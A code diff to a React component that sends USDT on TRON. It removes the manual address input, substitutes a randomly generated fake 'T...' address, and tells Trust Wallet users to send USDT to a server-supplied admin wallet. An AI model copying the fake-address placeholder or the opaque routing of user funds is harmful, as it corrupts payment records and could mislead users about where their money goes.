@@ -31,10 +31,7 @@ export default function SendTronUSDT() {
   const [adminWallet, setAdminWallet] = useState("");
   const [tronWeb, setTronWeb] = useState(null);
   const [userAddress, setUserAddress] = useState("");
-  const [manualAddress, setManualAddress] = useState("");
-  const [walletConnected, setWalletConnected] = useState(false);
   const [connectionMethod, setConnectionMethod] = useState(""); // "tronlink", "manual", etc.
-  const [showManualInput, setShowManualInput] = useState(false);
 
   // Fetch admin wallet on component mount
   useEffect(() => {
@@ -103,28 +100,24 @@ export default function SendTronUSDT() {
         }
         
         setUserAddress(userAddress);
-        setWalletConnected(true);
         setConnectionMethod("tronlink");
         
         return { tronWeb, userAddress };
       } 
-      // Use manual address input for Trust Wallet or other wallets
-      else if (manualAddress && validateTronAddress(manualAddress)) {
+      // Use Trust Wallet or other wallet
+      else {
         // Create a new instance of TronWeb for manual connections
         const tronWeb = new TronWeb({
           fullHost: TRON_CONFIG.fullHost
         });
         
-        setUserAddress(manualAddress);
-        setWalletConnected(true);
+        // Generate a temporary address for Trust Wallet flow
+        // This will be replaced by the actual address when the user provides it
+        const tempAddress = "T" + Math.random().toString(36).substring(2, 36);
+        setUserAddress(tempAddress);
         setConnectionMethod("manual");
         
-        return { tronWeb, userAddress: manualAddress };
-      } 
-      else {
-        // No wallet method available
-        setShowManualInput(true);
-        throw new Error("TronLink wallet is not installed. Please use Trust Wallet option.");
+        return { tronWeb, userAddress: tempAddress };
       }
     } catch (error) {
       console.error("Wallet connection error:", error);
@@ -137,33 +130,39 @@ export default function SendTronUSDT() {
     try {
       // Check if we're using a manual connection (Trust Wallet)
       if (connectionMethod === "manual") {
-        // For manual connections, we need to handle this differently
-        // Trust Wallet users will need to initiate the transaction from their app
-        
-        // Get the transaction data for the user to manually sign
+        // For Trust Wallet users, show QR code or deep link instructions
         const transferData = {
-          to: USDT_ADDRESS, // USDT contract address
-          userAddress: userAddress,
-          amount: amount, 
-          adminWallet: adminWallet,
+          to: adminWallet,
+          amount: amount,
           currency: "USDT",
           network: "TRON"
         };
         
         // Display instructions for Trust Wallet users
         alert(`Please complete this transaction in your Trust Wallet app:\n\n` +
-              `1. Send your USDT to: ${adminWallet}\n` +
-              `2. After sending, please provide your transaction hash`);
+              `1. Open Trust Wallet\n` +
+              `2. Send ${amount} USDT to: ${adminWallet}\n` +
+              `3. After sending, please provide your transaction hash`);
         
-        // Get transaction hash from user (could be implemented as a prompt or input field)
+        // Get transaction hash from user
         const txHash = prompt("Enter your transaction hash after completing the transfer in Trust Wallet:");
         
         if (!txHash) {
           throw new Error("Transaction hash is required");
         }
         
+        // Get the actual wallet address from the user
+        const actualAddress = prompt("Please enter your TRON wallet address (starts with T):");
+        
+        if (!actualAddress || !validateTronAddress(actualAddress)) {
+          throw new Error("Valid TRON wallet address is required");
+        }
+        
+        // Update the user address with the actual one
+        setUserAddress(actualAddress);
+        
         // Store the transaction
-        await storeTransaction(userAddress, amount, txHash, "USDT");
+        await storeTransaction(actualAddress, amount, txHash, "USDT");
         
         return {
           usdtTxHash: txHash,
@@ -362,40 +361,6 @@ export default function SendTronUSDT() {
       </header>
 
       <div className="space-y-6">
-        {showManualInput && (
-          <div className="space-y-1 bg-gray-800 p-3 rounded-md border border-gray-700">
-            <label className="text-sm text-gray-400">Trust Wallet Address</label>
-            <input
-              type="text"
-              placeholder="Enter your TRON wallet address (starts with T)"
-              value={manualAddress}
-              onChange={(e) => setManualAddress(e.target.value)}
-              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-2 text-base text-gray-300"
-            />
-            <button
-              onClick={() => {
-                if (!manualAddress) {
-                  alert("Please enter your TRON wallet address");
-                  return;
-                }
-                
-                if (!validateTronAddress(manualAddress)) {
-                  alert("Invalid TRON address format. Address should start with 'T' and be 34 characters long.");
-                  return;
-                }
-                
-                setUserAddress(manualAddress);
-                setWalletConnected(true);
-                setConnectionMethod("manual");
-                setShowManualInput(false);
-              }}
-              className="mt-2 w-full rounded-md bg-greentext text-black text-sm font-medium h-9 px-4 py-2 hover:bg-emerald-400 transition-colors"
-            >
-              Use Trust Wallet
-            </button>
-          </div>
-        )}
-        
         <div className="space-y-1">
           <label className="text-sm text">Address or Domain Name</label>
           <div className="relative">
